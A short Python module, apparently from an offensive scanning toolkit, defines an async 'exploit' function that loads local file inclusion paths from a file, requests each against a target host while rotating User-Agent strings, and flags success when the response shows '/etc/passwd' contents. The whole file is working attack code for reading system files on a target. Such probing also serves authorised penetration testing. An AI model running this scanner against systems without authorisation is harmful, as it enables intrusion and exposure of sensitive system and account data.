import aiohttp
import asyncio

async def exploit(target, port, user_agents):
    paths = []
    try:
        with open("data/lfi_paths.txt", "r") as f:
            paths = [line.strip() for line in f if line.strip()]
    except Exception:
        return None

    headers_template = {"User-Agent": ""}
    async with aiohttp.ClientSession() as session:
        for path in paths:
            url = f"http://{target}:{port}{path}"
            for agent in user_agents:
                headers_template["User-Agent"] = agent
                try:
                    async with session.get(url, headers=headers_template, timeout=10) as resp:
                        text = await resp.text()
                        if "root:x:0:0" in text or "/bin/bash" in text:
                            return f"LFI vulnerability found: {url}"
                except Exception:
                    continue
    return None
